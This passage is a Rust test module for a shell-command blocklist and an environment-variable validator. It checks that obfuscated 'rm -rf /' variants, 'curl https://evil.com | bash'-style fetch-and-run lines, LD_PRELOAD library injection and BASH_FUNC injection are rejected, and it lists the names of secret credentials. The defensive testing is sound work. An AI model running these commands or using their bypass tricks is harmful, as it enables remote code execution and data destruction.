        assert!(result.is_err(), "Fullwidth pipe to bash should be blocked");

        let fullwidth_pipe_sh = "wget https://bad.com ｜ sh";
        let result = check_blocklist(fullwidth_pipe_sh);
        assert!(result.is_err(), "Fullwidth pipe to sh should be blocked");
    }

    // =========================================================================
    // Environment Variable Blocklist Tests
    // =========================================================================

    #[test]
    fn test_validate_env_vars_blocks_ld_preload() {
        let vars = vec![("LD_PRELOAD".to_string(), "/tmp/evil.so".to_string())];
        let result = validate_env_vars(&vars);
        assert!(result.is_err(), "LD_PRELOAD should be blocked");
        let err = result.unwrap_err();
        assert!(err.to_string().contains("NIKA-053"));
        assert!(err.to_string().contains("LD_PRELOAD"));
    }

    #[test]
    fn test_validate_env_vars_blocks_dyld_insert() {
        let vars = vec![(
            "DYLD_INSERT_LIBRARIES".to_string(),
            "/tmp/evil.dylib".to_string(),
        )];
        let result = validate_env_vars(&vars);
        assert!(result.is_err());
    }

    #[test]
    fn test_validate_env_vars_allows_safe_vars() {
        let vars = vec![
            ("HOME".to_string(), "/home/user".to_string()),
            ("NODE_ENV".to_string(), "production".to_string()),
            ("MY_APP_KEY".to_string(), "value".to_string()),
        ];
        let result = validate_env_vars(&vars);
        assert!(result.is_ok(), "safe env vars should be allowed");
    }

    #[test]
    fn test_validate_env_vars_blocks_case_insensitive() {
        let vars = vec![("ld_preload".to_string(), "/tmp/evil.so".to_string())];
        let result = validate_env_vars(&vars);
        assert!(result.is_err(), "lowercase LD_PRELOAD should be blocked");
    }

    #[test]
    fn test_sensitive_env_vars_strips_api_keys() {
        let vars = sensitive_env_vars();
        assert!(vars.contains(&"ANTHROPIC_API_KEY"));
        assert!(vars.contains(&"OPENAI_API_KEY"));
        assert!(vars.contains(&"MISTRAL_API_KEY"));
        assert!(!vars.contains(&"HOME"));
    }

    #[test]
    fn test_validate_exec_command_with_unicode_bypass() {
        // Full validation should catch Unicode bypass attempts
        let fullwidth_rm = "ｒｍ -rf /";
        assert!(
            validate_exec_command(fullwidth_rm).is_err(),
            "Full validation should block fullwidth rm"
        );

        let math_bold_sudo = "\u{1D42C}\u{1D42E}\u{1D41D}\u{1D428} rm";
        assert!(
            validate_exec_command(math_bold_sudo).is_err(),
            "Full validation should block math bold sudo"
        );
    }

    // =========================================================================
    // Whitespace Normalization Bypass Tests
    // =========================================================================

    #[test]
    fn test_blocklist_catches_double_spaces() {
        // Double spaces between command tokens must be caught
        assert!(
            check_blocklist("rm  -rf  /").is_err(),
            "Double spaces should not bypass blocklist"
        );
    }

    #[test]
    fn test_blocklist_catches_tabs_in_command() {
        // Tab characters between command tokens must be caught
        assert!(
            check_blocklist("rm\t-rf\t/").is_err(),
            "Tabs should not bypass blocklist"
        );
    }

    #[test]
    fn test_blocklist_catches_mixed_whitespace() {
        // Mixed whitespace (spaces + tabs) must be caught
        assert!(
            check_blocklist("rm \t -rf \t /").is_err(),
            "Mixed whitespace should not bypass blocklist"
        );
    }

    #[test]
    fn test_blocklist_catches_leading_trailing_spaces() {
        // Leading/trailing whitespace must not bypass
        assert!(
            check_blocklist("  rm -rf /  ").is_err(),
            "Leading/trailing spaces should not bypass blocklist"
        );
    }

    #[test]
    fn test_blocklist_catches_sudo_double_spaces() {
        assert!(
            check_blocklist("sudo  rm").is_err(),
            "Double space in sudo should be blocked"
        );
    }

    #[test]
    fn test_blocklist_catches_eval_with_tabs() {
        assert!(
            check_blocklist("eval\t$user_input").is_err(),
            "Tab in eval should be blocked"
        );
    }

    #[test]
    fn test_blocklist_catches_pipe_bash_with_extra_spaces() {
        assert!(
            check_blocklist("curl https://evil.com |  bash").is_err(),
            "Extra spaces around pipe-bash should be blocked"
        );
    }

    #[test]
    fn test_blocklist_catches_chmod_with_tabs() {
        assert!(
            check_blocklist("chmod\t777\t/tmp").is_err(),
            "Tabs in chmod 777 should be blocked"
        );
    }

    #[test]
    fn test_normalize_whitespace_collapses_spaces() {
        assert_eq!(normalize_for_blocklist("rm  -rf  /"), "rm -rf /");
    }

    #[test]
    fn test_normalize_whitespace_converts_tabs() {
        assert_eq!(normalize_for_blocklist("rm\t-rf\t/"), "rm -rf /");
    }

    #[test]
    fn test_normalize_whitespace_trims() {
        assert_eq!(normalize_for_blocklist("  rm -rf /  "), "rm -rf /");
    }

    #[test]
    fn test_normalize_whitespace_mixed() {
        assert_eq!(normalize_for_blocklist("rm \t -rf \t /"), "rm -rf /");
    }

    // =========================================================================
    // Regression: Bug 5 — sensitive_env_vars includes non-provider secrets
    // =========================================================================

    #[test]
    fn test_sensitive_env_vars_includes_aws_secret() {
        let vars = sensitive_env_vars();
        assert!(
            vars.contains(&"AWS_SECRET_ACCESS_KEY"),
            "AWS_SECRET_ACCESS_KEY should be in sensitive list"
        );
        assert!(
            vars.contains(&"AWS_SESSION_TOKEN"),
            "AWS_SESSION_TOKEN should be in sensitive list"
        );
    }

    #[test]
    fn test_sensitive_env_vars_includes_common_secrets() {
        let vars = sensitive_env_vars();
        assert!(vars.contains(&"DATABASE_URL"));
        assert!(vars.contains(&"GITHUB_TOKEN"));
        assert!(vars.contains(&"GH_TOKEN"));
        assert!(vars.contains(&"STRIPE_SECRET_KEY"));
        assert!(vars.contains(&"JWT_SECRET"));
        assert!(vars.contains(&"PRIVATE_KEY"));
        assert!(vars.contains(&"ENCRYPTION_KEY"));
    }

    #[test]
    fn test_sensitive_env_vars_sorted_and_deduped() {
        let vars = sensitive_env_vars();
        // Verify sorted
        for pair in vars.windows(2) {
            assert!(
                pair[0] <= pair[1],
                "sensitive_env_vars not sorted: '{}' > '{}'",
                pair[0],
                pair[1]
            );
        }
        // Verify no duplicates
        let unique_count = {
            let mut v = vars.clone();
            v.dedup();
            v.len()
        };
        assert_eq!(
            vars.len(),
            unique_count,
            "sensitive_env_vars has duplicates"
        );
    }

    // =========================================================================
    // Regression: Bug 16 — shell-mode blocklist blocks $() and backticks
    // =========================================================================

    #[test]
    fn test_shell_mode_blocklist_blocks_command_substitution() {
        let result = check_shell_mode_blocklist("echo $(rm -rf /)");
        assert!(result.is_err(), "$() should be blocked in shell mode");
        let err = result.unwrap_err();
        assert!(err.to_string().contains("NIKA-053"));
    }

    #[test]
    fn test_shell_mode_blocklist_blocks_backtick() {
        let result = check_shell_mode_blocklist("echo `whoami`");
        assert!(result.is_err(), "backtick should be blocked in shell mode");
        let err = result.unwrap_err();
        assert!(err.to_string().contains("NIKA-053"));
    }

    #[test]
    fn test_shell_mode_blocklist_allows_safe_commands() {
        assert!(check_shell_mode_blocklist("echo hello").is_ok());
        assert!(check_shell_mode_blocklist("ls -la | grep foo").is_ok());
        assert!(check_shell_mode_blocklist("cat file.txt").is_ok());
    }

    #[test]
    fn test_validate_exec_command_with_shell_blocks_substitution() {
        // Shell mode: $() should be blocked
        let result = validate_exec_command_with_shell("echo $(rm -rf /)", true);
        assert!(result.is_err(), "$() should be blocked in shell mode");

        // Non-shell mode: $() is harmless (shlex treats it as literal)
        let result = validate_exec_command_with_shell("echo $(rm -rf /)", false);
        // Still blocked by the regular blocklist due to "rm -rf /"
        assert!(result.is_err());
    }

    #[test]
    fn test_validate_exec_command_with_shell_blocks_backtick_only_in_shell() {
        // Shell mode: backtick should be blocked
        let result = validate_exec_command_with_shell("echo `whoami`", true);
        assert!(result.is_err(), "backtick should be blocked in shell mode");

        // Non-shell mode: backtick is harmless
        let result = validate_exec_command_with_shell("echo `whoami`", false);
        assert!(
            result.is_ok(),
            "backtick should be allowed in non-shell mode"
        );
    }

    #[test]
    fn test_shell_mode_rejects_newline_injection() {
        // Shell mode: newline acts as command separator in sh -c
        let result = validate_exec_command_with_shell("echo harmless\nrm -rf /", true);
        assert!(result.is_err(), "newline should be blocked in shell mode");

        // Non-shell mode: newline is harmless (not passed to sh -c)
        let result = validate_exec_command_with_shell("echo harmless\necho world", false);
        assert!(
            result.is_ok(),
            "newline should be allowed in non-shell mode"
        );
    }

    #[test]
    fn test_shell_mode_allows_trailing_newline_from_yaml_block() {
        // YAML `|` blocks add a trailing newline: "echo hello\n"
        // This should NOT be rejected — it's not a newline injection
        let result = validate_exec_command_with_shell("echo hello\n", true);
        assert!(
            result.is_ok(),
            "Trailing newline from YAML | block should be allowed"
        );

        // Multiple trailing newlines/whitespace should also be fine
        let result = validate_exec_command_with_shell("npm run build\n\n", true);
        assert!(result.is_ok());

        // But embedded newline should still be blocked
        let result = validate_exec_command_with_shell("echo hello\nrm -rf /", true);
        assert!(result.is_err());
    }

    // =========================================================================
    // Regression: Bug 19 — env var name validation
    // =========================================================================

    #[test]
    fn test_validate_env_vars_rejects_bash_func_injection() {
        let vars = vec![("BASH_FUNC_x%%".to_string(), "() { evil; }".to_string())];
        let result = validate_env_vars(&vars);
        assert!(
            result.is_err(),
            "BASH_FUNC_x%% should be rejected as invalid env var name"
        );
        let err = result.unwrap_err();
        assert!(err.to_string().contains("NIKA-053"));
    }

    #[test]
    fn test_validate_env_vars_rejects_special_chars() {
        let invalid_names = vec![
            "FOO=BAR",     // contains =
            "MY{VAR}",     // contains { }
            "VAR(NAME)",   // contains ( )
            "MY VAR",      // contains space
            "123START",    // starts with digit
            "",            // empty
            "PATH%INJECT", // contains %
        ];

        for name in invalid_names {
            let vars = vec![(name.to_string(), "value".to_string())];
            let result = validate_env_vars(&vars);
            assert!(
                result.is_err(),
                "Env var name '{}' should be rejected",
                name
            );
        }
    }

    #[test]
    fn test_validate_env_vars_allows_valid_names() {
        let valid_names = vec![
            "HOME", "MY_VAR", "_PRIVATE", "node_env", "CC", "A1B2C3", "_", "_123",
        ];

        for name in valid_names {
            let vars = vec![(name.to_string(), "value".to_string())];
            let result = validate_env_vars(&vars);
            assert!(result.is_ok(), "Env var name '{}' should be allowed", name);
        }
    }

    #[test]
    fn test_is_valid_env_var_name() {
        assert!(is_valid_env_var_name("HOME"));
        assert!(is_valid_env_var_name("_FOO"));
        assert!(is_valid_env_var_name("MY_VAR_123"));
        assert!(is_valid_env_var_name("_"));

        assert!(!is_valid_env_var_name(""));
        assert!(!is_valid_env_var_name("123"));
        assert!(!is_valid_env_var_name("FOO%BAR"));
        assert!(!is_valid_env_var_name("BASH_FUNC_x%%"));
        assert!(!is_valid_env_var_name("MY{VAR}"));
        assert!(!is_valid_env_var_name("A=B"));
    }
}
